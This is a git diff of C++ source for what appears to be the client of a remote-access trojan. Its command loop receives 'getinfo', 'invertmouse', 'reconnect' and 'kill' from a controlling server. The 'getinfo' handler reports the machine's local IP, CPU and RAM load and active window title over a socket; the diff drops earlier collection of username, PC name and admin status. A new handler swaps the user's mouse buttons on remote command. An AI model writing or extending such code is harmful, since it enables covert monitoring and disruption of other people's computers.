@@ -1,29 +1,27 @@
 #pragma once
 
-bool GetInfo(TcpIP Client)
+bool GetInfo(SOCKET Sock)
 {
     SystemUtils su;
     DirUtils du;
 	WindowUtils wu;
 
-    json j;
+	json j;
 
-    j["IPL"] = TcpIP::GetLocalIP(Client.Sock);
-    j["OS"] = su.GetOS();
-    j["UAC"] = (su.CheckUAC()) ? "Admin" : "User";
-    j["PATH"] = du.GetFullFilePath();
-    j["VER"] = Version;
-    j["PCNAME"] = su.GetPCName();
-    j["USERNAME"] = su.GetCurrentUser();
+    j["IPL"] = TcpIP::GetLocalIP(Sock);
     j["CPU"] = to_string((int)su.GetCPUload()) + "%";
     j["RAM"] = to_string((int)su.GetRAMperc()) + "%";
 	j["ACTWIN"] = wu.GetWindowTitle();
 	j["INSTDATE"] = "TODO";
 
-    if (COMUNICAZIONI::GetInfo(Client.Sock, j.dump()))
-        return true;
+	return COMUNICAZIONI::GetInfo(Sock, j.dump());
+}
 
-    return false;
+bool InvertMouse(SOCKET Sock)
+{
+	MouseUtils mu;
+
+	return COMUNICAZIONI::InvertMouse(Sock, mu.InvertMouseButtons());
 }
 
 short Sessione(TcpIP Client)
@@ -35,12 +33,21 @@ short Sessione(TcpIP Client)
 		cmd = Client.RecvString();
 
 		if (cmd == "")
-			return 0;
+			i = false;
 		else if (cmd == "getinfo")
 		{
-			if (!GetInfo(Client))
-				return 0;
+			if (!GetInfo(Client.Sock))
+				i = false;
 		}
+		else if (cmd == "invertmouse")
+		{
+			if (!InvertMouse(Client.Sock))
+				i = false;
+		}
+		else if (cmd == "reconnect")
+			i = false;
+		else if (cmd == "kill")
+			return 1;
 	}
 
 	return 0;
